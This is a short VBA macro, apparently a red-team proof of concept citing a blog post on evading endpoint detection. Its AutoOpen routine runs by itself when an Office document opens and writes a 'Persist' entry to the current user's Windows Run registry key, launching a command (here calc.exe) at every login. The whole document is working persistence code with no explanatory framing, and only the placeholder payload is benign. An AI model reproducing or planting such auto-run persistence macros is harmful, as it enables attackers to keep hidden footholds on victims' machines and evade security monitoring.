Sub AutoOpen()
' https://blog.f-secure.com/dechaining-macros-and-evading-edr/
Set WshShell = CreateObject("WScript.Shell")
WshShell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Persist", "cmd.exe /C calc.exe", "REG_SZ"
End Sub

